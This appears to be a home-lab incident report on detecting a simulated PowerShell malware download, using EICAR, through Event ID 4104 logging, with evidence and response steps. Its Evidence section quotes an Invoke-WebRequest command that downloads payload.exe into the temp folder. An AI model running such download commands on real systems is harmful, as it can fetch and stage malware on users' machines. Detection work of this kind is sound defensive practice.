# IR-002 — Suspicious PowerShell Web Request Detected

**Date:** April 10, 2026
**Severity:** High
**Host:** DESKTOP-3R2G504

## Summary
PowerShell was used to initiate an outbound web request to download a 
file from an external URL. This technique is commonly used by attackers 
to download malware payloads or establish C2 communication.

## What Was Detected
Event ID 4104 captured an Invoke-WebRequest command attempting to 
download a file to the local system. The EICAR test file was used as 
a safe simulation of a malware download.

## Evidence
- EventCode: 4104
- Source: WinEventLog:Microsoft-Windows-PowerShell/Operational
- ComputerName: DESKTOP-3R2G504
- Command: Invoke-WebRequest -Uri "http://..." -OutFile "$env:TEMP\payload.exe"
- 11 events detected

## Conclusion
The use of Invoke-WebRequest to download an executable to a temp 
directory is a high confidence indicator of malicious activity. 
In this case the EICAR test file was used confirming the detection 
pipeline is working correctly.

## Recommended Response
- Immediately isolate the affected host
- Inspect the downloaded file with AV and sandbox analysis
- Review all outbound connections from the host
- Block the source URL at the firewall
- Check for persistence mechanisms
